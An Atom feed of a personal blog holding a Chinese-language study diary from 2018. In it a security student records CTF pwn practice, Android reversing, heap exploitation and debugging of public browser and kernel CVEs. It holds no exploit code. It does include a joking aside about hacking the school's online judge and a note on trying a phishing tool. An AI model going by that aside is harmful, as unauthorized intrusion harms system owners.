<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sakuraのblog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://eternalsakura13.com/"/>
  <updated>2019-07-09T02:27:42.042Z</updated>
  <id>http://eternalsakura13.com/</id>
  
  <author>
    <name>sakura</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Sakuraのdiary</title>
    <link href="http://eternalsakura13.com/2099/09/18/study/"/>
    <id>http://eternalsakura13.com/2099/09/18/study/</id>
    <published>2099-09-18T14:05:42.000Z</published>
    <updated>2019-07-09T02:27:42.042Z</updated>
    
    <content type="html"><![CDATA[<h2 id="2018-1-28"><a href="#2018-1-28" class="headerlink" title="2018-1-28"></a>2018-1-28</h2><p>1.看玄武实验室的每日安全推送（主要是看了android挖矿，p2p蠕虫）<br>2.配置shadow<br>尝试用gdb和gdbserver来调试<br><a href="https://github.com/CENSUS/shadow" target="_blank" rel="noopener">https://github.com/CENSUS/shadow</a><br><a href="https://developer.android.com/ndk/downloads/index.html?hl=zh-cn" target="_blank" rel="noopener">https://developer.android.com/ndk/downloads/index.html?hl=zh-cn</a><br><a href="http://kiya.studio/2017/06/21/android-gdb/" target="_blank" rel="noopener">http://kiya.studio/2017/06/21/android-gdb/</a><br>shadow文档的几个坑点</p><ul><li>arm-linux-androideabi-gdb，也就是gdb-arm版没有提供，要自己找，我装了一个ndk r10e，然后弄了一个，嗯，r11移除了gdb。</li><li>在gdb remote之前，文档里没有写forward转发，导致我试的时候一直refuse</li></ul><p>3.晚上最大的收获是看到了一个不错的blog（android逆向CTF）<br><a href="http://kiya.studio/2333/03/03/android-reversing-skills/#more" target="_blank" rel="noopener">http://kiya.studio/2333/03/03/android-reversing-skills/#more</a></p><h2 id="2018-1-29"><a href="#2018-1-29" class="headerlink" title="2018-1-29"></a>2018-1-29</h2><ol><li>看玄武的<a href="https://mp.weixin.qq.com/s/mOaXkGTY2704P6TV2KBvwg" target="_blank" rel="noopener">每日安全推送</a>，主要看了WinAFL</li><li>nexus5被我刷成砖……然后顺手把刷机、root和装xposed全都整理了一遍。</li><li>webkit的poc断点找到了，可以调了</li><li>做了一道阿里CTF第二题，一道关于反调试的题。</li></ol><h2 id="2018-1-31"><a href="#2018-1-31" class="headerlink" title="2018-1-31"></a>2018-1-31</h2><ol><li>看AI直播调webkit，感觉调浏览器好难呀。</li><li>看玄武的<a href="https://mp.weixin.qq.com/s/M4QZxs_G-lZ810o_i2KJhA" target="_blank" rel="noopener">每日安全推送</a>，主要关注了反调试和使用Strava 热力图来推断军事基地位置，很有趣的思路。</li><li>研究了一下加固原理和脱壳基础：dvmDexFileOpenPartial，还挺简单的。</li><li>研究了ptrace和调试器原理，了解了ptrace反调试的一些技巧</li></ol><h2 id="2018-2-1"><a href="#2018-2-1" class="headerlink" title="2018-2-1"></a>2018-2-1</h2><ol><li>本来想今天研究一下ndk编译的，不过睡着了……然后也没看什么东西</li><li>帮学弟解决了一些搭建博客的bug，顺便自己把博客的主题配色，代码高亮，搜索，评论什么的都修改或添加了，好看多了……</li></ol><h2 id="2018-2-2"><a href="#2018-2-2" class="headerlink" title="2018-2-2"></a>2018-2-2</h2><ol><li>看玄武的<a href="https://xuanwulab.github.io/cn/secnews/2018/02/02/index.html" target="_blank" rel="noopener">每日安全推送</a></li><li>钓鱼网站那个很有趣，我就测试了一下，然后因为ss代理不走终端，找了<a href="https://juejin.im/entry/5821840cd203090055134cc0" target="_blank" rel="noopener">一篇文章</a>和<a href="https://blog.kelu.org/tech/2017/07/06/parallels-vm-use-proxy-with-host-on-mac.html" target="_blank" rel="noopener">另一篇文章</a>，配置了一下就好了~</li><li>自己实践了一下那个钓鱼工具，实践文章和终端那个都可以在”杂项”分类里找到</li><li>研究了一下怎么用ndk-build编译一个能在手机上运行的c程序，这样明天就可以尝试hook了</li></ol><h2 id="2018-2-3"><a href="#2018-2-3" class="headerlink" title="2018-2-3"></a>2018-2-3</h2><ol><li>今天没有玄武的推送看~</li><li>研究了android native层hook，算是学到不少东西了。</li></ol><h2 id="2018-2-4"><a href="#2018-2-4" class="headerlink" title="2018-2-4"></a>2018-2-4</h2><ol><li>写了第一个xposed程序~遇到了一些坑，不过还是趟过去了。</li><li>修改nexus5的boot.img,打开系统调试，又坑了我一会。。</li></ol><h2 id="2018-2-5"><a href="#2018-2-5" class="headerlink" title="2018-2-5"></a>2018-2-5</h2><ol><li>今天出去怠惰了（茶）</li><li>xposed继续学习了一下，学会了一些姿势，感觉还是不错的~</li></ol><h2 id="2018-2-6"><a href="#2018-2-6" class="headerlink" title="2018-2-6"></a>2018-2-6</h2><ol><li>研究了怎么搭建shadowsocks服务端和优化</li><li>自己写了一个基于flask的B/S端口扫描器，代码太难看就不放了（茶</li></ol><h2 id="2018-2-7"><a href="#2018-2-7" class="headerlink" title="2018-2-7"></a>2018-2-7</h2><ol><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/FM-mZh1e8YQP0MWrV1IlVw" target="_blank" rel="noopener">2.6</a>和<a href="https://mp.weixin.qq.com/s/2JMrsyyuTErVy-pXRoL3Jg" target="_blank" rel="noopener">2.7</a><br>wordpress DOS有点意思，不过没搞懂，另外主要看了android安全公告2月版，看懂了一些（限于原理），开发太菜了。</li><li>学习了android的jni开发，基本的都摸了一遍。</li></ol><h2 id="2018-2-8"><a href="#2018-2-8" class="headerlink" title="2018-2-8"></a>2018-2-8</h2><ol><li>继续昨天的jni学习，摸清了native方法的动态注册</li><li>研究了下.init_array,结合jni动态注册，做了一道CTF题</li><li>继续看玄武每日推送<a href="https://mp.weixin.qq.com/s/sqPmC-z-HiH4UKArE1Gdgw" target="_blank" rel="noopener">2.8</a>,这篇<a href="https://www.fireeye.com/blog/threat-research/2018/02/reelphish-real-time-two-factor-phishing-tool.html" target="_blank" rel="noopener">钓鱼</a>的有趣</li><li>给AI写了个爬页面上文件的爬虫。</li></ol><h2 id="2018-2-9"><a href="#2018-2-9" class="headerlink" title="2018-2-9"></a>2018-2-9</h2><ol><li>研究android构建过程，Gradle工作流程</li><li>读玄武每日推送（存了个移动端静态分析的github准备好好看看）</li></ol><h2 id="2018-2-10"><a href="#2018-2-10" class="headerlink" title="2018-2-10"></a>2018-2-10</h2><ol><li>研究Dex文件格式和修复</li><li>学习了用ddms来dump出运行内存做题的技巧。</li><li>学习了新建android工程，调so文件解题。</li></ol><h2 id="2018-2-11"><a href="#2018-2-11" class="headerlink" title="2018-2-11"></a>2018-2-11</h2><ol><li>把昨天看到一道递归算法的android re做了，感觉现在做一般的CTF都有点思路了，做看雪的还是GG，还要提高姿势水平。</li><li>今天上午看到我在知乎的提问有师傅回答我了：<a href="https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。" target="_blank" rel="noopener">https://www.zhihu.com/question/266901100/answer/316607339，然后作死的又打开了这个洞CVE-2015-3864，嗯...我调没调出来，忙活了一上午，断点都没断下来，但是起码……嗯，我记住了名字！libstagefright，我是记住了……别等我学会了来找你。。</a></li><li>今天下午做完题就又瞎看了一会，思考我是不是选错了方向……android的调试贼麻烦，资料还贼少，看了看看雪，主要是浏览器、文件格式和内核，虽然其实都一样的，那些资料也不多，没法挖洞的……认识的dalao又少，没法充分交流QAQ，唉，感觉我是不是不适合当黑客，看vulcan的师傅微博，月月一大批CVE，就我什么都挖不到，不过今晚看了看师傅们的博客，他们的心路历程给了我很大勇气，是的，我早就不打算退后了，只有前进而已。</li></ol><h2 id="2018-2-12"><a href="#2018-2-12" class="headerlink" title="2018-2-12"></a>2018-2-12</h2><ol><li>今天刷空间看到moctf比赛，就参加了下，把android/linux re做掉就没看了。</li><li>依然很迷茫，不过其实想想，我开始学二进制，其实也就不到半年，进步速度并不是不能接受，只是在技能进阶上卡住了又没人交流而已，嗯，再想想好了。</li></ol><h2 id="2018-2-13到19"><a href="#2018-2-13到19" class="headerlink" title="2018-2-13到19"></a>2018-2-13到19</h2><ol><li>这些天几乎都过年去了……然后唯一做了点事就是把自己的课程设计做了，<a href="https://github.com/eternalsakura/PortScan" target="_blank" rel="noopener">PortScan</a></li><li>新年新气象，最近家里的事情也是乱七八糟，能多学点赚钱的技术分担压力就好了。</li><li>下学期的计划——fuzz、CVE漏洞研究、前端后端的一些Web开发（写点相关项目练手），然后找实习。</li><li>学会了一项新的运动，保龄球，很有意思。</li><li>最近一直什么都没学，自己也在反思一些东西，寻找一个前进的点。<br>比如浏览器，文件格式，还是内核，或者其他，还是都不是。<br>安全只是个抽象的概念，具体化了才能变成业务。<br>我还需要探究一段时间，读很多的漏洞分析文章，追随前辈们走过的路途，再进一步反思。<br>“一个漏洞的产生到漏洞利用至少会经历好几个阶段：Bug –&gt; exploitable bug(vulnerability) –&gt; poc –&gt; exploit –&gt; reliable/weaponized exploit。虽然大家都喜欢把fuzzing出来的bug讲成blah-blah-blah的故事或者作为PR，但我们真正关心的漏洞应该是能到最后两个阶段的vulnerability。”</li></ol><h2 id="2018-2-20到21"><a href="#2018-2-20到21" class="headerlink" title="2018-2-20到21"></a>2018-2-20到21</h2><ol><li>返校真是艰难……飞机火车客车出租全都转了一遍才到……</li><li>晚上收拾了下房间，看了看看雪，发现师傅做的有趣CTF题，<a href="https://bbs.pediy.com/thread-224686.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-224686.htm</a></li><li>群里在讨论内存管理和hook，被推荐了一本腾讯的手游安全的书《游戏安全：手游安全技术入门》，还不错，可以入个门……</li><li>看到一个博客提供了一些自定义ROM的资料，最近也想改，看到了就记录一下。<a href="https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338" target="_blank" rel="noopener">https://my.oschina.net/ibuwai/blog?catalog=3379629&amp;temp=1519222237338</a></li></ol><h2 id="2018-2-22"><a href="#2018-2-22" class="headerlink" title="2018-2-22"></a>2018-2-22</h2><ol><li>看了《手游安全技术那本书》，学习了注入技术。</li><li>下午买了考虫的口语能力提升班，然后学习了下</li><li>晚上在seebug逛，找各种二进制漏洞分析的资料，然后看到了陈良的ppt,remet的github,韩子诺的文章，还有很多很多……CVE-2014-7911感觉可以调调，我得整理整理我搜的资料，然后按照原理-&gt;漏洞分析-&gt;exp去学习w</li></ol><h2 id="2018-2-23到25"><a href="#2018-2-23到25" class="headerlink" title="2018-2-23到25"></a>2018-2-23到25</h2><ol><li>是的，仔细算算，我已经编译AOSP编译了三天了，而且还没编译好……现在已经基本放弃在mac上编译了，我现在突然想,flanker大神之所以用ubuntu做主力机……是不是因为在mac上编译不出AOSP呀……(逃)</li><li>明天在旧电脑上装win/ubuntu的双系统，要不是因为这学期有win网络编程和c#开发……我就直接烧ubuntu进去了（撑脸</li><li>嗯，不用明天了，在今天的收尾……新学期的开始……我终于是守得云开见月明，把AOSP弄出来了！</li></ol><h2 id="2018-2-26"><a href="#2018-2-26" class="headerlink" title="2018-2-26"></a>2018-2-26</h2><ol><li>学习了stack pivot，<a href="http://tacxingxing.com/2017/05/10/stack-pivot/" target="_blank" rel="noopener">劫持栈指针</a></li><li>学习了heap spray,<a href="http://secwiki.neu.edu.cn/wiki/images/f/fe/%E5%86%85%E5%AD%98%E5%96%B7%E5%B0%84%E5%9C%A8%E5%AE%89%E5%8D%93Root%E5%88%A9%E7%94%A8%E4%B8%AD_%E9%99%88%E8%89%AF.pdf" target="_blank" rel="noopener">堆喷</a></li><li>学习了<a href="http://pwn4.fun/2016/11/20/C-虚函数调用攻防战/" target="_blank" rel="noopener">虚表攻防</a></li><li>了解android<a href="https://www.blackhat.com/docs/us-15/materials/us-15-Xu-Ah-Universal-Android-Rooting-Is-Back.pdf" target="_blank" rel="noopener">root</a></li><li>Time-of-check Time-of-use (TOCTOU) Race Condition</li><li>今天还是认真的研究了一下之前没调出来的cve-2015-3864，因为这个漏洞有完整的利用链资料，非常的棒，虽然可能调不了什么的，但是理解这个利用过程也很有意义。<br>还是要感谢一下看雪师傅的<a href="https://bbs.pediy.com/thread-222893.htm" target="_blank" rel="noopener">文章</a>，还加了好友0.0，感觉要是我一开始就是编译的AOSP去调试……可能寒假就调出来了2333，反正感觉今天还是很有收获的。</li></ol><h2 id="2018-2-27"><a href="#2018-2-27" class="headerlink" title="2018-2-27"></a>2018-2-27</h2><ol><li>一上午调了道64位rop，还没调出来..exm???是这题的错还是我的错…多看看别人的exp好了，以前还是做题不够，积累不够。</li><li>继续看stagefright好了，争取今天多少调一调。</li><li>好吧，没看进去，gp0的exp大致看懂了，不过metaphor的思路还是费解，可能我现在的理解力还是不够。</li><li>下午一直在整理之前看的ptmalloc的一些基本概念，虽然意义不是很大，但是理一理总是好的，还是要为ctf-wiki打call，里面写了非常多的干货，明天继续整理。</li></ol><h2 id="2018-2-28"><a href="#2018-2-28" class="headerlink" title="2018-2-28"></a>2018-2-28</h2><ol><li>体育课累死……密码学数学基础有趣。</li><li>今天把heap exploit的unlink整理了一下，虽然最后那个例子有点问题，我换了两个系统都没成功，但是原理还是理清了，真的是都快忘了……</li></ol><h2 id="2018-3-1"><a href="#2018-3-1" class="headerlink" title="2018-3-1"></a>2018-3-1</h2><ol><li>又混了篇看雪的优秀，感觉还是蛮有成就感的，自己发的文章都不是优秀就是精品。</li><li>今天有点怠惰呢，明天要继续努力。</li></ol><h2 id="2018-3-2"><a href="#2018-3-2" class="headerlink" title="2018-3-2"></a>2018-3-2</h2><ol><li>今天一天都在整理fastbin的一个内容（其实还玩了一会Web，黑掉学校OJ嘿嘿嘿）</li><li>这道赛题略难，然后跟团队练习赛的PragyanCTF，感觉这赛题像是file io啊。。谁出的题这么皮。。</li></ol><h2 id="2018-3-3"><a href="#2018-3-3" class="headerlink" title="2018-3-3"></a>2018-3-3</h2><ol><li>生日快乐~自己，去订了蛋糕，今天继续研究了一下那个fastbin的题，真的很难。。</li><li>把android kernel也编译了出来，这次真的是可以调了。。</li></ol><h2 id="2018-3-4"><a href="#2018-3-4" class="headerlink" title="2018-3-4"></a>2018-3-4</h2><ol><li>今天和实验室大一的聊了下，然后把我能知道的东西，方向什么的，都聊了一下。</li><li>9447 CTF 2015的fastbin是真的难……我还是不懂，算了算了，明天看点别的吧，这个todo。</li><li>今天和一个师傅聊了下IoT漏洞应该怎么挖，受益匪浅，但是转换为具体的硬实力还需要多看多学多调。</li></ol><h2 id="2018-3-5"><a href="#2018-3-5" class="headerlink" title="2018-3-5"></a>2018-3-5</h2><ol><li>今天把那道fastbin的题认真的理了理，其实也不是很难，然后又把pragyan ctf2018的两道pwn题做了一下，第一道还好，那个目录遍历没理解上，看了wp会了，第二道就有点迷，静态链接下的格式化字符串漏洞，没办法覆盖got表，看了一篇wp是覆盖malloc_hook，这不是我白天看的那道fastbin的套路么……真的是……然后打开栈执行，这……真是脑洞，又感觉自己很菜……</li><li>嗯w，文章又被看雪推送了，还是感觉蛮不错的……希望能认识更多人吧w，今天看了看玄武每日推送的目录，非常nice，准备找个时间把这段时间没看的都啃一下。</li></ol><h2 id="2018-3-6"><a href="#2018-3-6" class="headerlink" title="2018-3-6"></a>2018-3-6</h2><ol><li>上周的比赛，搞到今天总算是大致调完了，就只剩一个点不懂，也是实在搞不懂了，教主说的很有道理，只有把文章写成博客，发出去，才能检验你到底对这个东西的理解怎么样，事实上，也只有在学习中的我，才会如此详细的写wp吧。</li></ol><h2 id="2018-3-7-8"><a href="#2018-3-7-8" class="headerlink" title="2018-3-7-8"></a>2018-3-7-8</h2><ol><li>这两天把漏洞战争的环境大致搭了一下，从用windbg到看到符号，还是折腾了一下。</li></ol><h2 id="2018-3-9-10"><a href="#2018-3-9-10" class="headerlink" title="2018-3-9-10"></a>2018-3-9-10</h2><ol><li>调了一下漏洞战争堆的第一个binary，然后熟悉了一下工具使用，还是nice.</li><li>调了cve-2012-1876的poc，发现了一些书上没有提到的地方和一个错误，就不提勘误了…都出了这么久了…原理差不多懂了，很有趣。</li><li>今天有意想不到的收获，或者说机会吧，希望我能把握好，然后做好安全研究，成为一个优秀的黑客。</li><li>列一个CVE调试计划吧，目前进度1/10<br>浏览器<br>3.7 CVE-2012-1876,堆溢出（p2o ie9)<br>4.3 CVE-2011-0027,整数溢出漏洞 (p2o ie8)<br>4.6 CVE-2013-2551,整数溢出漏洞(p2o ie10)<br>7.4 CVE-2013-1347,UAF(ie)<br>android<br>10.7 CVE-2014-3153 anroid kernel提权</li></ol><h2 id="2018-3-11-12"><a href="#2018-3-11-12" class="headerlink" title="2018-3-11-12"></a>2018-3-11-12</h2><ol><li>这两天进度比较低迷，第一天直接莽上去调exp然后被打脸…今天把vupen的文章仔细读了一遍，把整个利用过程理解了一下。</li><li>说来有个有趣的点，p2o之后cve-2012-1876不是应该补了么，怎么在win8+ie10上还能利用，更有趣的是vupen明明用这个洞getshell了ie9，但是为什么keen在Study of Exploit Migitation in Modern Browsers这个ppt上说了bstr的分配不再能被利用，那vupen到底是怎么写的exp…</li><li>最近的计划（才怪…</li></ol><ul><li>编译的前端后端</li><li>kernel的漏洞</li><li>看diff写poc…</li></ul><h2 id="2018-3-13-14"><a href="#2018-3-13-14" class="headerlink" title="2018-3-13-14"></a>2018-3-13-14</h2><ol><li>密码学数学基础和算法这些课也就算了，晚上还有软件开发的课，各种文档什么的…能不能好好lu代码，把之前写的项目project答辩完了。</li><li>等到了想等的结果，收心认真学习了。</li><li>晚上把计算机系统素养里的部分内容（VM）又看了一下，十分有意义。</li><li>为了学编译原理，先自己lu一个c语言解释器了解个大概吧。</li></ol><h2 id="2018-3-15-17"><a href="#2018-3-15-17" class="headerlink" title="2018-3-15-17"></a>2018-3-15-17</h2><ol><li>这几天把write a c interpret看完了，大致了解了编译器前后端，当然肯定现在还是不会写的。</li><li>调cve-2012-7864,虽然称不上调通exp，但是大部分都调出来了，poc调的很顺利，在exp就处处踩坑。</li><li>说来好像webkit的dom的堆被分开了，以后就不会有那么多uaf了。</li></ol><h2 id="2018-3-18-20"><a href="#2018-3-18-20" class="headerlink" title="2018-3-18-20"></a>2018-3-18-20</h2><ol><li>日记还是要每天记……都忘了自己每天做了什么了……把c++的project做完了，做了两道pwn题。</li><li>看了一下LCTF2017的题目,large bin的unlink确实没练过，还有一道simpleVM改的题，都做做好了。</li></ol><h2 id="2018-3-21-25"><a href="#2018-3-21-25" class="headerlink" title="2018-3-21-25"></a>2018-3-21-25</h2><p>lctf2017的题目里学到不少东西，另外关于堆利用的姿势实在是不足，此外无libc利用这个也要再学习一下。<br>这几天除了两个project写，还打了强网杯，感觉就是什么都不会吧。。可能不该死磕一道题，应该都看看？…啊啊啊，难受死了，离顶尖水平差的根本不是一点半点……<br>还看了一篇清华的论文，非常nice。<a href="http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1" target="_blank" rel="noopener">http://jcs.iie.ac.cn/ch/reader/view_abstract.aspx?file_no=20180101&amp;flag=1</a><br>还是有的挫败呢，离别人的水平。</p><h2 id="2018-3-26"><a href="#2018-3-26" class="headerlink" title="2018-3-26"></a>2018-3-26</h2><p>1.读玄武每日推送[<a href="http://chuansong.me/n/2253059751415" target="_blank" rel="noopener">http://chuansong.me/n/2253059751415</a>].</p><ul><li>mark一下<a href="https://rootkits.xyz/blog/2018/03/kernel-uninitialized-heap-variable/" target="_blank" rel="noopener">windows kernel漏洞利用</a>，mark一下k0师傅的<a href="https://whereisk0shl.top/post/2018-03-21" target="_blank" rel="noopener">UBUNTU 16.04 EBPF ARBITRARY READ/WRITE 漏洞分析</a>和360src的<a href="https://cert.360.cn/report/detail?id=ff28fc8d8cb2b72148c9237612933c11" target="_blank" rel="noopener">这篇</a>,看来调kernel还是有的调。</li><li>看到的<a href="https://github.com/sashs/arm_exploitation/blob/master/exploitation_on_arm_based_systems.pdf" target="_blank" rel="noopener">ARM exp开发</a>就很简略，感觉学不到什么东西。</li><li>mark一个超棒的<a href="http://www.makelinux.net/kernel_map/" target="_blank" rel="noopener">linux kernel交互图</a>，还能在页面上点击跳转到资料<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-LKM3_2048.png" alt=""></li><li>还有一个Stack pivoting  exploit的图收了,不知道他们怎么画的图这么好看。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-03-26-030340.jpg" alt=""></li><li><a href="https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5a00963153450a8779b23489/1509987890282/Windows" target="_blank" rel="noopener">windows注册表审计</a>感觉以后用得到</li><li><a href="https://twitter.com/_niklasb/status/977141034059747328" target="_blank" rel="noopener">p2o的沙盒逃逸漏洞</a>这个感觉十分有意思。</li><li>blackhat上总有很多好议题，比如这个<a href="https://www.blackhat.com/docs/asia-18/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf" target="_blank" rel="noopener">绕过ASLR的新思路</a></li></ul><p>2.准备配linux kernel的调试环境，真的是……配不起来啊，双机调试，拉取符号文件，设置串口，改配置开启调试功能。rbq,rbq<br>3.加入了chamd5团队，有师傅一起学pwn，一起讨论真是太棒了QVQ</p><h2 id="2018-3-27"><a href="#2018-3-27" class="headerlink" title="2018-3-27"></a>2018-3-27</h2><ol><li><p>上午和出强网杯kernel题的师傅聊了一下kernel的调试环境搭建和赛题，师傅人蛮好。。<br>搭建的话，muhe师傅的<a href="https://www.anquanke.com/post/id/85837" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85837</a><br><strong>编译linux 注意去掉不必要的东西，然后编译busybox 然后插入内核  写linux init 最后制作cpio</strong><br>这样就可以qemu+gdb调试了，很nice。</p></li><li><p>下午和晚上忙各种杂七杂八的事情反正……不过总算还是把要复盘的赛题做完了。</p></li><li>另外，感觉自己的努力和天赋还是被人肯定的，加油吧，自己QVQ。</li></ol><h2 id="2018-3-28"><a href="#2018-3-28" class="headerlink" title="2018-3-28"></a>2018-3-28</h2><ol><li>人生这种东西，其实就是起起落落落落落落落落落落落落落落落落落落落落落落落落落落落落，23333<br>瞎看了半天linux inside，还看了下linux x86-64 asm，感觉没什么进展。</li><li>晚上在知乎提了个问题，别人指了一条很nice的路线给我，还和其他人get了一点点资料，感觉我应该也是可以搞的吧，嗯哼。<br>其实今天一直比较浮躁，还是昨天晚上的一些后遗症吧，还有就是期望和现实的落差……<br>不过冷静的回想一下，不能让自己立刻从舒适区脱离，从新掌握新的知识，那怎么进步呢？且行且努力（乖巧</li></ol><h2 id="2018-3-29"><a href="#2018-3-29" class="headerlink" title="2018-3-29"></a>2018-3-29</h2><ol><li>这几天事挺多的，今天才把blackhat的ppt都下载下来,然后看了下<a href="https://0x00sec.org/t/linux-internals-the-art-of-symbol-resolution/1488" target="_blank" rel="noopener">linux符号解析</a>还发现了一个<a href="https://github.com/elfmaster/skeksi_virus" target="_blank" rel="noopener">正在开发中的linux病毒</a></li><li>收集了蛮多linux kernel资料慢慢啃……今天啃了两个ppt，纯英文的那么多……我也是很意外自己读起来没什么障碍的……<br>学什么都要一步一步呀，能调通一个，调试就没什么了，后面的学习速度就看对于kernel和保护的理解了。</li></ol><h2 id="2018-3-30-31"><a href="#2018-3-30-31" class="headerlink" title="2018-3-30-31"></a>2018-3-30-31</h2><ol><li>这两天发生的事情还蛮多的，最近发生的一些事让我觉得，自己调的真洞还是太少，调就要调出来还要能调通，不过说实话吧……浏览器和kernel的洞真的不好调，我学二进制又不久……现在比赛练pwn都来不及，还要分身调洞，确实有点难啊……</li><li>不过kernel的ppt啃了俩，感觉纯英文的资料也就那个样子了，读起来还是挺流畅的，要是真的不懂换成中文我也不懂……</li><li>把kernel题的环境搭起来了，有师傅请教真的是比自己搞好太多……另外堆的题感觉有感觉了，准备给自己一个比较长的训练周期，比如十天，彻底脑内模拟透，最近进步还是蛮多，加油。<br>mark一个师傅的<a href="http://veritas501.space/2018/03/28/%E4%B8%A4%E6%AC%A1CTF%E6%AF%94%E8%B5%9B%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">博客</a></li></ol><h2 id="2018-4-1-3"><a href="#2018-4-1-3" class="headerlink" title="2018-4-1-3"></a>2018-4-1-3</h2><ol><li>打了一场0ctf，感觉自己还是太菜，不过在师傅们的帮助下，把能搞懂的题都搞懂了，学到很多很多东西，还是很开心的。</li><li>写wp太麻烦了坦白说。。不过还是写吧，不写的话自己都不知道能记得多久……</li></ol><h2 id="2018-4-4-11"><a href="#2018-4-4-11" class="headerlink" title="2018-4-4-11"></a>2018-4-4-11</h2><ol><li>这几天电脑键盘坏了，电脑送修什么都没干。下了个吃鸡手游，嗯，还挺好玩的，今天早上电脑到了删了。</li><li>把0ctf2018的4道pwn复盘完了，折腾kernel调试环境。。还是挺麻烦的。</li><li>想要的很简单，得到却很难，好想去实验室做安全研究。</li></ol><h2 id="2018-4-12"><a href="#2018-4-12" class="headerlink" title="2018-4-12"></a>2018-4-12</h2><ol><li>今天从qemu+gdb，各种花式报错，到搭建内核的双机调试，简直了……总算最后是勉强在win机器上弄好了。<br>今天得到的一个启发是，先找一个可以用的方案去做，不要想什么一次做到最好，到有机会再换方案。</li><li>英语作业还没做……唉……赶作业赶作业……</li></ol><h2 id="2018-4-13"><a href="#2018-4-13" class="headerlink" title="2018-4-13"></a>2018-4-13</h2><ol><li>今天也是一堆事情，睡到中午然后开始做ddctf，那个逆向的mips还有android逆向的RSA，pwn的win kernel exploit真的是有、意思。反正我不想做了，不如学习一个<a href="https://blog.betamao.me/2018/02/26/ptmalloc%E5%B0%8F%E8%AE%B0/" target="_blank" rel="noopener">新姿势</a></li><li>linux kernel调试的环境算是彻底搭好了，今天解决了两个昨天没解决的bug，已经可以看到源码了。</li></ol><h2 id="2018-4-14-15"><a href="#2018-4-14-15" class="headerlink" title="2018-4-14-15"></a>2018-4-14-15</h2><ol><li>解决了内核不能单步调试的问题，然后在复习信安数学了。。再不看要凉了</li><li>仔细跟了一下poc，感觉还是能看懂的。</li></ol><h2 id="2018-4-16-17"><a href="#2018-4-16-17" class="headerlink" title="2018-4-16-17"></a>2018-4-16-17</h2><ol><li>自己看了下日记，4月除了修电脑配环境，几乎什么都没做，这段时间心态太浮躁了，嗯，加个太，也要准备投几家实习了，本来以为可以拿到的offer，都感觉凉了，不过算了，我是要去实验室做安全研究的人呢。</li><li>分析了cve-2017-8890的漏洞成因和模型还有patch</li></ol><h2 id="2018-4-18"><a href="#2018-4-18" class="headerlink" title="2018-4-18"></a>2018-4-18</h2><ol><li>今天也是一堆的课，晚上和师傅们聊天聊八卦去了。。结果只把UAF对象的分配和释放调了调。</li><li>了解了一下实验室面试啥的，要好好调CVE了。</li></ol><h2 id="2018-4-19"><a href="#2018-4-19" class="headerlink" title="2018-4-19"></a>2018-4-19</h2><ol><li>看了看师傅们的面试题，觉得其实自己还能再抢救一下。。</li><li>今天看了长亭的kernel的洞，感觉分析成因还是很好分析的…但是exp调起来麻烦，也懒得写博客记录了，今天把webkit的调试记录了一下，明明好久之前就搞了，结果到现在还是这样没什么进展（茶</li></ol><h2 id="2018-4-20-21"><a href="#2018-4-20-21" class="headerlink" title="2018-4-20-21"></a>2018-4-20-21</h2><ol><li>编了一天v8，搞不出来，墙真讨厌。</li><li>调（看）了一个webkit的UAF漏洞，还行，感觉最难懂的还是对象之间的引用关系太复杂，还有就是回调函数跟着跟着容易找不到自己在哪。<br>“我是谁，谁在打我。”（逃）</li></ol><h2 id="2018-4-22-24"><a href="#2018-4-22-24" class="headerlink" title="2018-4-22-24"></a>2018-4-22-24</h2><ol><li>打了一场*ctf，又学到了新姿势。</li><li>在看v8，看JIT，看R大的回答，xjb搜文章，还是不错。</li><li>调通了p2o的一个v8的oob的洞，cve-2017-5053,还是不难。</li></ol><h2 id="2018-4-25-28"><a href="#2018-4-25-28" class="headerlink" title="2018-4-25-28"></a>2018-4-25-28</h2><ul><li><p>补一些浏览器的基础吧</p></li><li><p>学习了一下一个新的内核洞，有新的trick总结</p></li><li>最近觉得该搞搞利用了，路由器固件也可以玩一下，安全研究这么有趣，什么都能摸一下（才怪</li></ul><h2 id="2018-4-29-30"><a href="#2018-4-29-30" class="headerlink" title="2018-4-29-30"></a>2018-4-29-30</h2><ol><li>国赛打完了，各种不走心，状态奇差，混进赛区半决赛了，CTF也玩到这了吧先，后面好好研究浏览器。</li><li>看了Natalie Silvanovich写的How to Find JavaScript Vulnerabilities with Code Review</li></ol><ul><li>Determine intended functionality</li><li>Review implementation of important features</li><li>Review previously reported bugs</li><li>Brainstorm likely vulnerable areas</li><li>Review code!<br>Mozilla docs (MDN) is a great start for JS</li></ul><ol><li>想翻一些议题视频看的时候翻到了一个仓库，js vul的，存一下，<a href="https://github.com/tunz/js-vuln-db" target="_blank" rel="noopener">js-vuln-db</a></li></ol><h2 id="2018-4-31-5-2"><a href="#2018-4-31-5-2" class="headerlink" title="2018-4-31-5.2"></a>2018-4-31-5.2</h2><ol><li>看了一个js optimized code<a href="https://www.microsoft.com/en-us/research/video/chakra-script-optimized-code/" target="_blank" rel="noopener">视频</a>，虽然是chakra的<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-074634.png" alt=""><br>不过感觉，有点没用…这些我都知道（</li><li>看v8的gc,利用和各种，反正还是挺迷的，先看吧QVQ</li><li>看到一幅很棒的图，新的v8的执行图？<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-02-151804.jpg" alt=""></li><li>看webkit技术内幕找灵感，看洞有点看不明白了。</li></ol><h2 id="2018-5-3"><a href="#2018-5-3" class="headerlink" 